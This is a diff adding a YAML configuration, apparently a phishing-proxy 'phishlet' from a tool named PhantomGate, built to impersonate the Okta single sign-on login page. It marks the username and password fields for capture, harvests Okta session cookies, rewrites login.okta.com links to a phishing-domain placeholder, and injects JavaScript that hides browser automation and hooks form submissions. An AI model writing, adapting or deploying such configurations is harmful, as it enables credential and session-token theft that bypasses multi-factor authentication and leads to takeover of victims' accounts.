@@ -1,0 +1,63 @@
+name: Okta
+author: PhantomGate
+version: 2.0.0
+description: Okta SSO authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - okta.com
+    - login.okta.com
+    - admin.okta.com
+  
+  login:
+    domain: login.okta.com
+    path: /login/default
+    username:
+      selector: "input#okta-signin-username"
+      capture: true
+    password:
+      selector: "input#okta-signin-password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: sid
+        regex: ".*"
+      - name: token
+        regex: ".*"
+      - name: DT
+        regex: ".*"
+      - name: JSESSIONID
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: okta.com
+      inject: true
+    - domain: login.okta.com
+      inject: true
+  
+  sub_filters:
+    - domain: okta.com
+      search: "https://login.okta.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Okta
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#okta-signin-username');
+        var password = form.querySelector('#okta-signin-password');
+        if (username && password) {
+          console.log('[PhantomGate] Okta credentials captured');
+        }
+      }, true);
+    })();
